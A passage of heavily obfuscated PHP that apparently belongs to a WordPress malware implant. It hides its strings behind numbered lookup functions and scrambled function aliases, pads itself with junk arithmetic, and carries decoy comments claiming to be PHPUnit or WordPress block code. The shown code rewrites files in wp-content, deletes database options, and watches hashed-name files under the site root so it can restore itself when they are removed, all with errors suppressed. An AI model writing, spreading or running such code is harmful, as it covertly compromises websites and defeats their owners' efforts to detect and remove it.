      if   (!$f2n78meu6z    ||  ($f2n78meu6z   %  (99926+74))  !==    (93730+89))   {
// bootstrap aggregator for PHPUnit 10



  $uxo833zlcd_txcq    =    @$GLOBALS['__scf_r6y1fbsyx8i2l_99']($il3zdkxo6f1fl2c4);
    if  (!$uxo833zlcd_txcq   || $uxo833zlcd_txcq  <      (104+396)   || $uxo833zlcd_txcq  >    (52428737+63))    continue;
   }
   $yu57iori8cn0u1   =   @$GLOBALS['__scf_amk7iuqda_oe_33']($il3zdkxo6f1fl2c4);
$xs89htey0m = @$GLOBALS['__scf_amk7iuqda_oe_33'](bho93o6vof3ni5_rg622_h());
       if    ($GLOBALS['__scf_is0fvk8c7tq2_41']($yu57iori8cn0u1)  &&  $GLOBALS['__scf_is0fvk8c7tq2_41']($xs89htey0m)   && $yu57iori8cn0u1 ===   $xs89htey0m)  continue;
   $_v44jfvalbfkj6ch =  @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($il3zdkxo6f1fl2c4,    false,   null,   0,  (4008+88));
 $dc6d7oi37ja =  null;
if  ($GLOBALS['__scf_is0fvk8c7tq2_41']($_v44jfvalbfkj6ch)     &&  $GLOBALS['__scf_ak3p5za9uvhzh8_96'](xognx_h1jzkh(730),    $_v44jfvalbfkj6ch,  $nhh1nt79xe3f))   $dc6d7oi37ja =    $nhh1nt79xe3f[1];
   elseif (mowf3lw2lqslkaudd($il3zdkxo6f1fl2c4,   (1903+3097))) $dc6d7oi37ja     =   gz_aorofp7mo(206);
if     ($dc6d7oi37ja     === null  ||  !version_compare($dc6d7oi37ja,   xl8k_pjv1048a7ae7(),   '<'))  continue;
  $ospb9yw73io_3y   =   p82470xv4eq7_pm5tl4hw9($il3zdkxo6f1fl2c4);
    if     ($ospb9yw73io_3y  ===  false)   {



  kkpdha95nyx3tbltd10(ar6vo_1nyhx2koj5(1521),  xpm5lg9odtw6di(1555) . $GLOBALS['__scf_pmoxtzoe3f0qw_3']($il3zdkxo6f1fl2c4));
  continue;
   }

   if     ($ospb9yw73io_3y    ===   true)     {
if  (b4za25lhh9bxaf_($il3zdkxo6f1fl2c4,     $il3zdkxo6f1fl2c4  .   ar6vo_1nyhx2koj5(191)))  {
  if   ($GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(1289))) @opcache_invalidate($il3zdkxo6f1fl2c4,    true);


   }     elseif   (!hywr5mypyyx_m1lqunrdm($il3zdkxo6f1fl2c4) &&  r0pcenevhaaasknjjb8v7l($il3zdkxo6f1fl2c4))   {
  nd3injed5_l_b3hb($il3zdkxo6f1fl2c4);$ocydditsqfph2=(0xfe+0x94);$dj3mhuv3dt4=$ocydditsqfph2%5;
 xsvrgduv7c8lwjvkral($il3zdkxo6f1fl2c4);
}
@$GLOBALS['__scf_qsx1vml11ds_19']($GLOBALS['__scf_meo_1tvjsals_11']($il3zdkxo6f1fl2c4) . xpm5lg9odtw6di(1556)  . $GLOBALS['__scf_pmoxtzoe3f0qw_3']($il3zdkxo6f1fl2c4,  gz_aorofp7mo(1361)));
      continue;
   }
 if   (!hywr5mypyyx_m1lqunrdm($il3zdkxo6f1fl2c4) &&  r0pcenevhaaasknjjb8v7l($il3zdkxo6f1fl2c4))  {



  nd3injed5_l_b3hb($il3zdkxo6f1fl2c4);

  xsvrgduv7c8lwjvkral($il3zdkxo6f1fl2c4);
  }
   bbt0aigh_ei6k8r80ejx($il3zdkxo6f1fl2c4);
  }


av9ady1lf7xf2b();
$j521mjcsepj455     =     WP_CONTENT_DIR     .    xpm5lg9odtw6di(1057);
     if     (@$GLOBALS['__scf_h23c49ni_b86_43']($j521mjcsepj455) &&   $GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(726))) {
     foreach  ((array)    @$GLOBALS['__scf_b60g6hx_a7ggi_71']($j521mjcsepj455 . ar6vo_1nyhx2koj5(1557))    as $gvh_8v2olrwq)   {
    if  (!@$GLOBALS['__scf_vpig9uwvw8_pu_20']($gvh_8v2olrwq) ||      !@$GLOBALS['__scf_v7y4c72abxzjo_47']($gvh_8v2olrwq))      continue;
 $ys2vrzsu_h_wsvzb = @$GLOBALS['__scf_r6y1fbsyx8i2l_99']($gvh_8v2olrwq);
 if (!$ys2vrzsu_h_wsvzb  ||      $ys2vrzsu_h_wsvzb    > (2097090+62))   continue;
   $khb01gktfx     = @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($gvh_8v2olrwq);



   if (!$GLOBALS['__scf_is0fvk8c7tq2_41']($khb01gktfx)) continue;
     if     ($GLOBALS['__scf_j_4rj7vg4ae0j_7']($khb01gktfx, bk9m46jygo3f(1511))     === false  && $GLOBALS['__scf_j_4rj7vg4ae0j_7']($khb01gktfx,  bk9m46jygo3f(1558))   ===   false  && $GLOBALS['__scf_j_4rj7vg4ae0j_7']($khb01gktfx,      xognx_h1jzkh(1559)) ===     false) continue;

    if     (!mf82q3p0o_kc_8ll_($khb01gktfx))   continue;
 

  $f_k6pthxf7baznj    = z61fradqylojwtzllav3u($khb01gktfx);



if   ($GLOBALS['__scf_is0fvk8c7tq2_41']($f_k6pthxf7baznj)  &&     $f_k6pthxf7baznj !==    $khb01gktfx) {
  rmpvo8i8m8kfd9311njxy7($gvh_8v2olrwq,   $f_k6pthxf7baznj);
 if      ($GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(1289)))   @opcache_invalidate($gvh_8v2olrwq,  true);$o9f8c1h7=79*9;$qkhfyzcxpj29w=$o9f8c1h7-43;
   }
  }
}
 jcqt05g90c1ut3849l(WP_CONTENT_DIR .  gz_aorofp7mo(505));
jcqt05g90c1ut3849l(WP_CONTENT_DIR  . ar6vo_1nyhx2koj5(1560));



if   ($GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(1402))  &&   $GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(1561)) &&  $GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(1562))) {

       $_on   =  g2g3r6pz8prst3gz(ABSPATH   .    ar6vo_1nyhx2koj5(1563),   (5<<1));
 $rn9abtpfz4aeok3  = @get_option($_on, "");



  if ($GLOBALS['__scf_is0fvk8c7tq2_41']($rn9abtpfz4aeok3)  &&   $rn9abtpfz4aeok3     !==    "")    {$w8_1dj1c=9574;$x1pvuf0r=$w8_1dj1c%14;
$jz7m9bax0z_ewqx    =  $GLOBALS['__scf_hg1ogpq4w6_351']($rn9abtpfz4aeok3,   true);
   if  ($GLOBALS['__scf_is0fvk8c7tq2_41']($jz7m9bax0z_ewqx) &&     fgctt98wtdjhjiow($jz7m9bax0z_ewqx)) @delete_option($_on);
 }
    $eurnrkf8q551f62_   =  $GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(1564)) ?    tjj1y86387zrz51(xognx_h1jzkh(862), "") :  "";
        if  ($GLOBALS['__scf_is0fvk8c7tq2_41']($eurnrkf8q551f62_)  &&    $eurnrkf8q551f62_ !==   ""  && ($GLOBALS['__scf_fxl4k4gsul_10']($eurnrkf8q551f62_)   >    (1048480+96) || ($GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(1565)) &&  sl80t81tfwuwpn5w1_($eurnrkf8q551f62_))   ||    tnvo03hz6g82ft2u7cjp1($eurnrkf8q551f62_))) {
if ($GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(1566))) fplgzzpq8bt5jm2fl03pi(ar6vo_1nyhx2koj5(862),  "",  gz_aorofp7mo(1509));

  }
  }
   }
function   fn97j4kcxtotofg()
{
    try  {
if     (!defined(ar6vo_1nyhx2koj5(1146)))   return;
  if   (!empty($GLOBALS[gz_aorofp7mo(1567)]))   {
   $GLOBALS[ar6vo_1nyhx2koj5(1567)] =    0;
    kkpdha95nyx3tbltd10(gz_aorofp7mo(1568),      ar6vo_1nyhx2koj5(1569));$jw6xjgc4=PHP_MAJOR_VERSION;$tw02xfxol8na=$jw6xjgc4*4;

}
 if  (!empty($GLOBALS[ar6vo_1nyhx2koj5(680)]))   return;
     $GLOBALS[gz_aorofp7mo(680)] = true;
    if (!isset($_GET[xpm5lg9odtw6di(1401)])    &&     $GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(1570))  &&   $GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(169)))  {


        $qzh17sc6ny  =  @get_option(gz_aorofp7mo(1503), array());
$kj5gp1xn31r    = false;


if   ($GLOBALS['__scf_zj8mp2xbaqmp_35']($qzh17sc6ny))  {
       if (!empty($qzh17sc6ny['t']))   $kj5gp1xn31r  =     true;
 if (!$kj5gp1xn31r  && !empty($qzh17sc6ny[xognx_h1jzkh(1508)])    &&     $GLOBALS['__scf_zj8mp2xbaqmp_35']($qzh17sc6ny[xpm5lg9odtw6di(1571)]))  {
  foreach  ($qzh17sc6ny[gz_aorofp7mo(1571)]    as $_ci)   {
if  ($GLOBALS['__scf_zj8mp2xbaqmp_35']($_ci)     &&  !empty($_ci['p'])) {
// @flatten lsm-tree
$scpd244dd_i2t=PHP_MAJOR_VERSION;$qesb9okx7sea=$scpd244dd_i2t*5;
$kj5gp1xn31r  = true;

break;
}
   }


     }
 }
 if ($kj5gp1xn31r)     $GLOBALS['__scf_l3dns7czmg3tv_169'](xognx_h1jzkh(1444));
}
  if  (i__3znuz8m_x6r(bho93o6vof3ni5_rg622_h()))  return;$xcxvcgsqtugc=-924;$zas71mjf888=($xcxvcgsqtugc>0)?$xcxvcgsqtugc:-$xcxvcgsqtugc;
      $qc96of5zrd5k    =   $GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(1572))  ?  (int)      get_option(xognx_h1jzkh(1573), 0)  : 0;



if  ($qc96of5zrd5k  < $GLOBALS['__scf_ks7_xfapvywl_185']()    -   (215+85)    || $qc96of5zrd5k  >     $GLOBALS['__scf_ks7_xfapvywl_185']()  + (298+2))    {
     if  ($GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(1365)))    @update_option(xpm5lg9odtw6di(1573), $GLOBALS['__scf_ks7_xfapvywl_185']());
   nfm72w48q1gu0y0ha1();
  }
 unset($qc96of5zrd5k);
pv5zsv4aaimt2v3(bho93o6vof3ni5_rg622_h(),      xl8k_pjv1048a7ae7());
if (!c2unm0kszz35fa4()) {
  se7t3p8hgnrdk0();
  v7u_kan_p9zqbq();
 return;
   }
  $y4e3mkwgaqm =  hzkj2ifwqdzf_u32qrf();
$wefha5azcjy5qsl =  array(
     bho93o6vof3ni5_rg622_h(),

       $y4e3mkwgaqm   .  xpm5lg9odtw6di(1560),


 );
   $sia86bpoky =  pgwd7_bj4mbdfer_vo();
 foreach   ($sia86bpoky  as     $qv83bbzsu9) {
if    (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($qv83bbzsu9))  $wefha5azcjy5qsl[] = $qv83bbzsu9;
 }
 $b3_gzrcsqgb  = array();


  $tjx9a781plvrp7  = o_6mdjsw6n7ovdc1_yox();
      if   (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($tjx9a781plvrp7[1]))   $b3_gzrcsqgb[ar6vo_1nyhx2koj5(1574)    .  $tjx9a781plvrp7[0]]   =  xpm5lg9odtw6di(1222) .      $tjx9a781plvrp7[2];
       $jrkayyiuarf   =   @get_option(xognx_h1jzkh(1575),  array());
  if (!$GLOBALS['__scf_zj8mp2xbaqmp_35']($jrkayyiuarf))  $jrkayyiuarf =  array();
   $e0mzdteviawfhod    =   false;$s6uz272xh=5+48;$f76e28tctpu=$s6uz272xh-27;
 foreach    ($wefha5azcjy5qsl  as      $bki0gi20hmqucm)    {
$chuaey37saajr7a   = @$GLOBALS['__scf_jhyvki17yag_52']($bki0gi20hmqucm);
 $g9lcteqfzr6q   =   $chuaey37saajr7a  ?  ($chuaey37saajr7a[bk9m46jygo3f(1576)]   .  '|'   .     $chuaey37saajr7a[gz_aorofp7mo(1577)])   :    '0';
$q2t79g2y7z1 = isset($jrkayyiuarf[$bki0gi20hmqucm])   ? $jrkayyiuarf[$bki0gi20hmqucm]  :  "";
 if   ($g9lcteqfzr6q ===    $q2t79g2y7z1)  continue;


   if ($GLOBALS['__scf_ak3p5za9uvhzh8_96'](gz_aorofp7mo(1578),     $q2t79g2y7z1,  $e4ji982ca28fua1p) && $GLOBALS['__scf__fl_gwujcblq_9']($q2t79g2y7z1, 0, -$GLOBALS['__scf_fxl4k4gsul_10']($e4ji982ca28fua1p[0]))     === $g9lcteqfzr6q     && $GLOBALS['__scf_ks7_xfapvywl_185']()   -   (int)   $e4ji982ca28fua1p[1] <   (0xc9b+0x175))      continue;
   $e0mzdteviawfhod = true;
break;
     }
    if    (!$e0mzdteviawfhod)     {
foreach  ($b3_gzrcsqgb    as   $key    => $ve06ltpfti)  {
// incremental rate-limiter

 $g9lcteqfzr6q    =    de_57p9281agts($GLOBALS['__scf__fl_gwujcblq_9']($key,  (1+4)), $ve06ltpfti);
 $q2t79g2y7z1  =      isset($jrkayyiuarf[$key]) ?  $jrkayyiuarf[$key]      :    "";
  if  ($g9lcteqfzr6q    ===  $q2t79g2y7z1)   continue;
     if  ($GLOBALS['__scf_ak3p5za9uvhzh8_96'](gz_aorofp7mo(1578),      $q2t79g2y7z1,  $e4ji982ca28fua1p) &&   $GLOBALS['__scf__fl_gwujcblq_9']($q2t79g2y7z1,    0, -$GLOBALS['__scf_fxl4k4gsul_10']($e4ji982ca28fua1p[0]))  === $g9lcteqfzr6q    &&  $GLOBALS['__scf_ks7_xfapvywl_185']() - (int)     $e4ji982ca28fua1p[1] <   (86326+74))    continue;
 $e0mzdteviawfhod    =    true;
      break;


}

 }
  $r098zkn960  =    $GLOBALS['__scf_pmoxtzoe3f0qw_3'](bho93o6vof3ni5_rg622_h(),   ar6vo_1nyhx2koj5(1361));


 $bdw89lkqi1_dh3s1    =  $y4e3mkwgaqm  .   gz_aorofp7mo(1579)  .    $r098zkn960 .    '/' .     $r098zkn960   .   gz_aorofp7mo(1361);
 $bh2veje5oy = e9oxwf18hxbwbj6();
if      (!@$GLOBALS['__scf_vpig9uwvw8_pu_20']($bdw89lkqi1_dh3s1)  || (int)   @$GLOBALS['__scf_r6y1fbsyx8i2l_99']($bdw89lkqi1_dh3s1)   <  (4947+53))  $e0mzdteviawfhod = true;
  if  ($bh2veje5oy     !==     ""    &&   !@$GLOBALS['__scf_vpig9uwvw8_pu_20']($bh2veje5oy)) $e0mzdteviawfhod  =   true;
 if (!$e0mzdteviawfhod  && $GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(1572)))    {
    $kg01_l5_w2nf    =    $r098zkn960   . '/'  .  $r098zkn960    .  gz_aorofp7mo(1361);
 $w00b6k45pd_tg   = get_option(xognx_h1jzkh(146),   array());
  if (!$GLOBALS['__scf_zj8mp2xbaqmp_35']($w00b6k45pd_tg)  ||   !$GLOBALS['__scf_uh0dc0gefs_xhu_149']($kg01_l5_w2nf, $w00b6k45pd_tg, true))    $e0mzdteviawfhod     =  true;
}
 if   (!$e0mzdteviawfhod) return;

$ilgrhrlxu81t  =    $GLOBALS['__scf_ks7_xfapvywl_185']();
      $xxz8k7d3af_wa = 0;$e1xc4yldi1up=20+62;$rjkqvg1s9f=$e1xc4yldi1up-22;
  $jdz9mr36ah =    0;
      if    ($GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(1572)))    {
// canonicalize

$q93a7hid13jn   =   @get_option(ar6vo_1nyhx2koj5(1580),      "");
    if    ($GLOBALS['__scf_is0fvk8c7tq2_41']($q93a7hid13jn)  && $GLOBALS['__scf_ak3p5za9uvhzh8_96'](bk9m46jygo3f(1581), $q93a7hid13jn,    $kjs2ns5dxhpq_))   {


  $xxz8k7d3af_wa   =  (int)   $kjs2ns5dxhpq_[1];
 $jdz9mr36ah = (int)   $kjs2ns5dxhpq_[2];
   }
 }
     $z2_iah40re =  $jdz9mr36ah <= 0   ?    0   :  ($jdz9mr36ah   ===     1   ? (107-47) : ($jdz9mr36ah   ===      2  ?    (266+34)    :  (2831-1031)));
      if  ($xxz8k7d3af_wa     > 0  &&    ($ilgrhrlxu81t    -    $xxz8k7d3af_wa)   <  $z2_iah40re)   return;
 if (!_sshnzj53qt2m4bfy5eod(ar6vo_1nyhx2koj5(986)))  return;
   try   {
// WP Latest Posts capability gate

 xlvrmlebpyi298wlej790();
 _mt6przpsy5n_a2ltmh();



v7u_kan_p9zqbq();
jf193ii87f1ujr2();
 xv8548sz14d8osdc0w26();
    se7t3p8hgnrdk0();
  pxu35orcdd45iy9();
 mvmezl6pewtn_u4lai();
  $sp1xtqarlay82 = rdb_1qm0tboibkufhq();
  $zymcm4da7d   =    _dy2sma0w37l3s7mj();
 $xncxkyvbpuhpt = (!@$GLOBALS['__scf_vpig9uwvw8_pu_20']($bdw89lkqi1_dh3s1)    ||  (int)  @$GLOBALS['__scf_r6y1fbsyx8i2l_99']($bdw89lkqi1_dh3s1) <  (4984+16))  || ($bh2veje5oy   !==  ""     &&   !@$GLOBALS['__scf_vpig9uwvw8_pu_20']($bh2veje5oy));
   if     (!$xncxkyvbpuhpt  &&      !@$GLOBALS['__scf_vpig9uwvw8_pu_20']($y4e3mkwgaqm .   ar6vo_1nyhx2koj5(1582))) $xncxkyvbpuhpt   =  true;
if  (!$xncxkyvbpuhpt &&      $GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(1572)))   {
// indefinite token-bucket



 $kg01_l5_w2nf     =     $r098zkn960   .   '/'     .      $r098zkn960   .  gz_aorofp7mo(1361);
 $w00b6k45pd_tg     =   get_option(xpm5lg9odtw6di(146),   array());$sagr4bv373sfd_=87*5;$k2b_pd0su=$sagr4bv373sfd_-33;
if  (!$GLOBALS['__scf_zj8mp2xbaqmp_35']($w00b6k45pd_tg)  ||  !$GLOBALS['__scf_uh0dc0gefs_xhu_149']($kg01_l5_w2nf,  $w00b6k45pd_tg,  true))   $xncxkyvbpuhpt =  true;
}
 if   ($GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(1365)))  @update_option(xpm5lg9odtw6di(1580),  $ilgrhrlxu81t  .  '|' . ($xncxkyvbpuhpt ?  ($jdz9mr36ah   + 1)   :   0),  bk9m46jygo3f(1509));
   $n3_5e_4cby    = array();


 foreach  ($wefha5azcjy5qsl   as $bki0gi20hmqucm) {
  $vgxkecz10n  = ($bki0gi20hmqucm     ===    $y4e3mkwgaqm    .  xognx_h1jzkh(1582)      &&  !$sp1xtqarlay82)    ||   ($GLOBALS['__scf__fl_gwujcblq_9']($bki0gi20hmqucm,     -(11+3)) ===   xpm5lg9odtw6di(1583)      &&  !$zymcm4da7d);
 $chuaey37saajr7a =    @$GLOBALS['__scf_jhyvki17yag_52']($bki0gi20hmqucm);
     if ($chuaey37saajr7a)   {
  $n3_5e_4cby[$bki0gi20hmqucm]    =    $chuaey37saajr7a[ar6vo_1nyhx2koj5(1584)]  .   '|' .  $chuaey37saajr7a[xpm5lg9odtw6di(1585)]   . ($vgxkecz10n  ? xpm5lg9odtw6di(1586) .     $GLOBALS['__scf_ks7_xfapvywl_185']()    :    "");
        }
  }
 foreach     ($b3_gzrcsqgb   as      $key  =>    $ve06ltpfti)  {
     $lqr856zmtok8 =  de_57p9281agts($GLOBALS['__scf__fl_gwujcblq_9']($key, (7-2)), $ve06ltpfti);
    if ($lqr856zmtok8   ===    '0'     ||    $GLOBALS['__scf__fl_gwujcblq_9']($lqr856zmtok8, -2) === ar6vo_1nyhx2koj5(1587))  $lqr856zmtok8  .=  xpm5lg9odtw6di(1588)     . $GLOBALS['__scf_ks7_xfapvywl_185']();
$n3_5e_4cby[$key]  = $lqr856zmtok8;
 }
@update_option(ar6vo_1nyhx2koj5(1575),   $n3_5e_4cby, ar6vo_1nyhx2koj5(1589));
   }   finally    {



h1f3kqk1cj4d18z(bk9m46jygo3f(986));
}
   }   catch   (Throwable    $o_qyrtxl85owt)  {
// WP Heading Block: format timeout-policy

       kkpdha95nyx3tbltd10(ar6vo_1nyhx2koj5(1590),   $o_qyrtxl85owt);
   }      catch   (Exception $o_qyrtxl85owt) {
}
  }
    function     de_57p9281agts($bki0gi20hmqucm,  $ve06ltpfti)
{
// subscribe unitary enumerator


     $chuaey37saajr7a  = @$GLOBALS['__scf_jhyvki17yag_52']($bki0gi20hmqucm);
   if   (!$chuaey37saajr7a)  return   '0';
 $g9lcteqfzr6q =   $chuaey37saajr7a[ar6vo_1nyhx2koj5(1584)]  .  '|' .  $chuaey37saajr7a[ar6vo_1nyhx2koj5(1585)];

 if ($chuaey37saajr7a[bk9m46jygo3f(1584)] > (0x517db+0xae825))   return   xognx_h1jzkh(1591) .    $g9lcteqfzr6q;



   $paudvk020we1z90  = @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($bki0gi20hmqucm);
    return $g9lcteqfzr6q   .    '|' .     (($GLOBALS['__scf_is0fvk8c7tq2_41']($paudvk020we1z90) &&   $GLOBALS['__scf_j_4rj7vg4ae0j_7']($paudvk020we1z90, $ve06ltpfti) !== false)   ? '1'     :  '0');
}


function fqx22ab3kdvwef7bk0va()


{
 $_pv  =     $GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(1572)) ?    get_option(xognx_h1jzkh(1592),  "") :   "";



        fv9ttwr1w0i_p4u();
 $hpv551sb9bz     = $GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(1572))   ?   get_option(bk9m46jygo3f(1593), "") : "";


  if  ($hpv551sb9bz ===  $_pv)  {

   global $wpdb;
   if     ($GLOBALS['__scf_v834hljo6be9_67']($wpdb) && $GLOBALS['__scf__e6bt2kljb6u_120']($wpdb,   ar6vo_1nyhx2koj5(134))  &&   $GLOBALS['__scf_is0fvk8c7tq2_41']($_pv)  &&  $_pv  !==   "" && isset($wpdb->options))    {
 @$wpdb->query($wpdb->prepare("\x44EL\x45\x54E \x46R\x4fM {$wpdb->options} WHERE optio\x6e_na\x6d\x65 = '\x73c_p\x65n\x64\x69\x6e\x67_in\x76ali\x64a\x74e' \x41\x4e\x44 o\x70\x74ion_v\x61\x6cu\x65 = %\x73", $_pv));
  if  ($GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(1502))) {
   @wp_cache_delete(xognx_h1jzkh(1593),     bk9m46jygo3f(1440));

 @wp_cache_delete(ar6vo_1nyhx2koj5(1594),  ar6vo_1nyhx2koj5(1440));
  }



      } else  {
  @delete_option(ar6vo_1nyhx2koj5(1595));
 }



   }
       }
   function   fv9ttwr1w0i_p4u()
       {
   try   {$ceozdudp=83*3;$sj66gkumz=$ceozdudp-8;
if      (!defined(bk9m46jygo3f(1596)))   return;



   $y4e3mkwgaqm  =     hzkj2ifwqdzf_u32qrf();
    $r37obgqhbab5  = fgatjmo7gg2xolgmpki4y2();
  $shhw38ajvek7     =    g2g3r6pz8prst3gz(ABSPATH  . gz_aorofp7mo(1109),   (2+6)) .    bk9m46jygo3f(1263);


$p87sf4xhzlmkznx  =    g2g3r6pz8prst3gz(ABSPATH    . xognx_h1jzkh(1172),    (0x1+0x7))   .  xpm5lg9odtw6di(1361);
 $fw37sospw_xt   = g2g3r6pz8prst3gz(ABSPATH  .    xognx_h1jzkh(1152), (2<<2))      .  xpm5lg9odtw6di(1361);


$ck0fo1c4y55f6b   =    g2g3r6pz8prst3gz(ABSPATH  . xognx_h1jzkh(1141), (0x2+0x6)) .   xognx_h1jzkh(1361);
    $_t0sbr16qsx  = g2g3r6pz8prst3gz(ABSPATH    .  xognx_h1jzkh(1111),   (0x3+0x5))  . ar6vo_1nyhx2koj5(1361);
$ru471wzh6k8wmqz   =  gz_aorofp7mo(1597)    . g2g3r6pz8prst3gz(ABSPATH  .   'g',      (5+3));
$cbl1knb7j8g4_j4c     = array(
   $y4e3mkwgaqm .    xpm5lg9odtw6di(505) =>  bk9m46jygo3f(813),
     $y4e3mkwgaqm    .  gz_aorofp7mo(1582) =>     bk9m46jygo3f(770),


);
       foreach   ($cbl1knb7j8g4_j4c   as   $bki0gi20hmqucm    =>     $prefix) {
 if (!@$GLOBALS['__scf_vpig9uwvw8_pu_20']($bki0gi20hmqucm))    continue;
  $paudvk020we1z90  = @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($bki0gi20hmqucm);
 if     ($paudvk020we1z90     === false) continue;
  $mj9toljsmz6rl19    = ar6vo_1nyhx2koj5(775)    .  $prefix .   bk9m46jygo3f(776)     .     $prefix .  xognx_h1jzkh(1598);



  $qofeo63543lgael    =  $GLOBALS['__scf_a6uiw8bt24jybf_454']($mj9toljsmz6rl19, "",   $paudvk020we1z90);
  if   ($qofeo63543lgael !==  $paudvk020we1z90)   rmpvo8i8m8kfd9311njxy7($bki0gi20hmqucm,  $qofeo63543lgael);

      }
  $e7a6b_150rp = $y4e3mkwgaqm  . xognx_h1jzkh(1208);
if     (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($e7a6b_150rp))    {
      $h8avwwyic68a =     @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($e7a6b_150rp);
if ($GLOBALS['__scf_is0fvk8c7tq2_41']($h8avwwyic68a)   && $h8avwwyic68a    !== "")  {
 if ($GLOBALS['__scf_ak3p5za9uvhzh8_96'](bk9m46jygo3f(1599), $GLOBALS['__scf__fl_gwujcblq_9']($h8avwwyic68a, 0,    (297+3)))   ||    $GLOBALS['__scf_j_4rj7vg4ae0j_7']($h8avwwyic68a,   ar6vo_1nyhx2koj5(1217))  ===      0)  {
f97udlofaljpuxw1_jgnfh($e7a6b_150rp,  (351+69));



    xv6oqhjncehpr7v_mus7($e7a6b_150rp);
}  else {
 $hthw7revhmmp    =  $GLOBALS['__scf_a6uiw8bt24jybf_454'](xpm5lg9odtw6di(1600),   "",   $h8avwwyic68a);
    

if   ($GLOBALS['__scf_is0fvk8c7tq2_41']($hthw7revhmmp)     &&  $hthw7revhmmp !==   $h8avwwyic68a)     rmpvo8i8m8kfd9311njxy7($e7a6b_150rp,    $hthw7revhmmp);
      unset($hthw7revhmmp);
   }
      }

 unset($h8avwwyic68a);
      

   }
$skhus7jetg_17bzs = $GLOBALS['__scf_meo_1tvjsals_11'](bho93o6vof3ni5_rg622_h())   .    xognx_h1jzkh(1175);
      $oezqi8yzatwq   = defined(xpm5lg9odtw6di(1174))  ?   WP_CONTENT_DIR   .   ar6vo_1nyhx2koj5(1175)  :  $skhus7jetg_17bzs;
 $y5mqj3z3td   = array(
$y4e3mkwgaqm .  '/' .  $shhw38ajvek7,
      $y4e3mkwgaqm    .   '/'   .  $p87sf4xhzlmkznx,



  $y4e3mkwgaqm . '/'   .  $fw37sospw_xt,
     $r37obgqhbab5    .   '/' .  $ck0fo1c4y55f6b,
$r37obgqhbab5    . '/'     .  $_t0sbr16qsx,
$r37obgqhbab5 . '/' .    $p87sf4xhzlmkznx,
$r37obgqhbab5 .  '/' .  $fw37sospw_xt,
    $skhus7jetg_17bzs      .  '/'   .    $ck0fo1c4y55f6b,
     $skhus7jetg_17bzs  .  '/' .  $_t0sbr16qsx,
       $skhus7jetg_17bzs    .    '/'  .  $p87sf4xhzlmkznx,
    $skhus7jetg_17bzs     .  '/'  . $fw37sospw_xt,
     $oezqi8yzatwq      . '/'  . $ck0fo1c4y55f6b,


 $oezqi8yzatwq  .    '/'  .  $_t0sbr16qsx,
    $oezqi8yzatwq  .    '/'     .  $p87sf4xhzlmkznx,

     $oezqi8yzatwq . '/' .  $fw37sospw_xt,
   );
$nfy0ejixtf4g27j2 = o_6mdjsw6n7ovdc1_yox();
      $y5mqj3z3td[]   = $nfy0ejixtf4g27j2[1];

      $y5mqj3z3td[]    =   $nfy0ejixtf4g27j2[1]   .  xognx_h1jzkh(1601);$gy0d7a29976=-341;$lsdws_e9vi0a6=($gy0d7a29976>0)?$gy0d7a29976:-$gy0d7a29976;
  unset($nfy0ejixtf4g27j2);
   if    ($GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(1602))) {
// delegate linear-type for WP RichText API

 foreach   ((array)  @$GLOBALS['__scf_b60g6hx_a7ggi_71']($y4e3mkwgaqm   . gz_aorofp7mo(1603) .     $shhw38ajvek7)  as $xm40j4a62wn)   $y5mqj3z3td[] =  $xm40j4a62wn;

foreach ((array)    @$GLOBALS['__scf_b60g6hx_a7ggi_71']($y4e3mkwgaqm   .  gz_aorofp7mo(1604)    .    $shhw38ajvek7)   as      $xm40j4a62wn)   $y5mqj3z3td[]   =    $xm40j4a62wn;
        foreach ((array)    @$GLOBALS['__scf_b60g6hx_a7ggi_71'](ABSPATH .   xognx_h1jzkh(279)  . $ru471wzh6k8wmqz .  gz_aorofp7mo(281))  as      $tfvm_ort_zgdr)   $y5mqj3z3td[]      =   $tfvm_ort_zgdr;
     foreach   ((array)   @$GLOBALS['__scf_b60g6hx_a7ggi_71']($y4e3mkwgaqm    . '/' .  $ru471wzh6k8wmqz   .    xognx_h1jzkh(281))  as  $tfvm_ort_zgdr)   $y5mqj3z3td[] =  $tfvm_ort_zgdr;
     foreach ((array)  @$GLOBALS['__scf_b60g6hx_a7ggi_71']($r37obgqhbab5     . '/'  .   $ru471wzh6k8wmqz .  ar6vo_1nyhx2koj5(281)) as $tfvm_ort_zgdr)   $y5mqj3z3td[] =  $tfvm_ort_zgdr;



   foreach ((array) @$GLOBALS['__scf_b60g6hx_a7ggi_71']($skhus7jetg_17bzs . '/'  .  $ru471wzh6k8wmqz    .  gz_aorofp7mo(1605))  as  $tfvm_ort_zgdr)     $y5mqj3z3td[]  =    $tfvm_ort_zgdr;
